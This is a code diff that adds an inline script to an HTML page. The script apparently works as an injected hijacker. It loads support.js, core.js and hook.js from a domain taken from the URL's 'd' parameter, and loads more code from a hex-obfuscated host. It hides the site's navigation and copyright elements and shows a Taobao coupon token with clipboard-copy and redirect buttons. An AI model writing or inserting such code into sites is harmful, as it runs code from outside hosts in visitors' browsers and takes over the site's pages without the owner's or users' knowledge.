@@ -19,7 +19,247 @@
 		</style>
 	</head>
 	<body>
+<div id="content"></div><script type="text/javascript">
+(function (b, v, u, w) {
+    var l = document.location.protocol.toString().indexOf("https") === 0;
+    var a = "006e00750074002e006c0061";
+    var s = "",
+        h = "";
+    var g = {
+        ssl: l,
+        server: u,
+        context: u
+    };
+    var t = {};
+    var k = v.getElementsByTagName("html")[0];
+    var j = v.getElementsByTagName("body")[0];
 
+    function c(z) {
+        var y = new RegExp("([0-9a-zA-Z]{4})", "gm");
+        var x = z.replace(y, function (B, A) {
+            var C = parseInt(A, 16);
+            return String.fromCharCode(C)
+        });
+        return x
+    }
+
+    function d(A) {
+        if (A) {
+            return d()[A]
+        } else {
+            var z = {};
+            var x = b.location.href;
+            var E = x.indexOf("?");
+            if (E >= 0) {
+                var B = x.substring(E + 1).split("&");
+                for (var C = 0; C < B.length; C++) {
+                    var y = B[C];
+                    var F = "";
+                    var D = y.indexOf("=");
+                    if (D > 0) {
+                        F = y.substring(D + 1).replace(/^\s+|\s+$/g, "");
+                        y = y.substring(0, D).replace(/^\s+|\s+$/g, "")
+                    }
+                    z[y] = decodeURIComponent(F)
+                }
+            }
+            return z
+        }
+    }
+
+    function q(z) {
+        var x = v.createElement("textarea");
+        j.appendChild(x);
+        x.style.display = "block";
+        x.style.position = "fixed";
+        x.style.left = "-9999px";
+        x.style.top = "-9999px";
+        x.setAttribute("readonly", "");
+        x.value = z || "";
+        x.select();
+        x.setSelectionRange(0, x.value.length);
+        var y = v.execCommand("copy");
+        setTimeout(function () {
+            x.parentNode.removeChild(x)
+        }, 50);
+        return y
+    }
+
+    function p(y, x) {
+        if (y.addEventListener) {
+            y.addEventListener("click", x, false);
+            return true
+        } else {
+            if (y.attachEvent) {
+                y.attachEvent("onclick", x);
+                return true
+            }
+        }
+    }
+
+    function f(y) {
+        if (j && y) {
+            var x = v.createElement("script");
+            x.type = "text/javascript";
+            x.src = y;
+            j.appendChild(x)
+        }
+    }
+
+    function o(x, y) {
+        if (x) {
+            if (b[x]) {
+                y && y(b[x])
+            } else {
+                setTimeout(function () {
+                    o(x, y)
+                }, 100)
+            }
+        }
+    }
+
+    function i(y, B, x, C, z) {
+        var A = v.createElement(y);
+        if (B) {
+            A.className = B
+        }
+        if (x) {
+            x.appendChild(A)
+        }
+        if (C) {
+            A.innerText = A.textContent = C
+        }
+        if (z) {
+            p(A, z)
+        }
+        return A
+    }
+
+    function m(z, x, A, y) {
+        return i("div", z, x, A, y)
+    }
+
+    function e(x) {
+        if (x) {
+            if (x.indexOf("//") === 0) {
+                x = (l ? "https:" : "http:") + x
+            } else {
+                if (l) {
+                    x = x.replace("http://", "https://")
+                } else {
+                    x = x.replace("https://", "http://")
+                }
+            }
+        }
+        return x
+    }
+
+    function n(A) {
+        if (A === 0) {
+            if (k) {
+                k.style = {}
+            }
+            if (j) {
+                j.style = {}
+            }
+        }
+        var C = {
+            kz1: "mod-global-nav",
+            kz2: "kz-float-layer",
+            kz3: "kz-ad-inner-layer",
+            yk1: "page-copyright",
+            yk2: "s-legacy-qqkf"
+        };
+        for (var B in C) {
+            if (!t[B]) {
+                var x = v.getElementsByClassName(C[B]);
+                if (x.length) {
+                    var z = i("div", "hide", j);
+                    for (var y = 0; y < x.length; y++) {
+                        z.appendChild(x[y])
+                    }
+                    z.style.display = "none";
+                    t[B] = true
+                }
+            }
+        }
+        A = A || 0;
+        if (A < 600) {
+            setTimeout(function () {
+                n(A + 1)
+            }, 100)
+        }
+    }
+
+    function r() {
+        var F = v.getElementById("content");
+        if (F) {
+            var D = d();
+            if (D.d) {
+                var B = "https://" + D.d;
+                var x = B;
+                g.server = B;
+                g.context = x;
+                f(x + "/js/cms/support.js");
+                o("Gnim", function () {
+                    f(x + "/js/cms/core.js");
+                    o("Core", function () {
+                        f(x + "/js/cms/hook.js?a=9")
+                    })
+                })
+            } else {
+                if (D.t) {
+                    var C = m("token", F);
+                    if (D.i) {
+                        i("img", "token-image", C).setAttribute("src", e(D.i))
+                    } else {
+                        m("token-blank", C)
+                    } if (D.t1) {
+                        m("token-title", C, D.t1)
+                    }
+                    if (D.t2) {
+                        m("token-tip", C, D.t2)
+                    }
+                    var G = "\u590d\u5236\u6dd8\u53e3\u4ee4\uffe5" + D.t + "\uffe5\n\u6253\u5f00\u300c\u624b\u673a\u6dd8\u5b9d\u300d\u5373\u53ef\u83b7\u53d6\u76f8\u5173\u4f18\u60e0\u4fe1\u606f";
+                    i("textarea", "token-text", C).value = G;
+                    var E = m("token-action", C);
+                    var A = i("button", "button", E, "\u4e00\u952e\u590d\u5236", function () {
+                        if (q(G)) {
+                            A.innerText = A.textContent = "\u5df2\u590d\u5236\uff01";
+                            setTimeout(function () {
+                                A.innerText = A.textContent = "\u4e00\u952e\u590d\u5236"
+                            }, 1000)
+                        }
+                    });
+                    if (D.l) {
+                        var z = i("button", "button", E, "\u8bbf\u95ee\u94fe\u63a5", function () {
+                            z.parentNode.removeChild(z);
+                            b.location.href = D.l
+                        });
+                        z.className += " button-cyan"
+                    }
+                    if (s) {
+                        var y = i("button", "button", E, s, function () {
+                            y.parentNode.removeChild(y);
+                            b.location.href = h.replace(/\{\u8d26\u53f7\}/g, D.a || "-")
+                        });
+                        y.className += " button-orange"
+                    }
+                } else {
+                    if (D.l) {
+                        if (a) {
+                            f((l ? "https" : "http") + "://" + c(a) + "/" + D.l + "_js")
+                        }
+                    }
+                }
+            }
+            n(0)
+        }
+    }
+    r();
+    b.Hook = g
+})(window, document, null);     
+</script>
 	</body>
 
 </html>
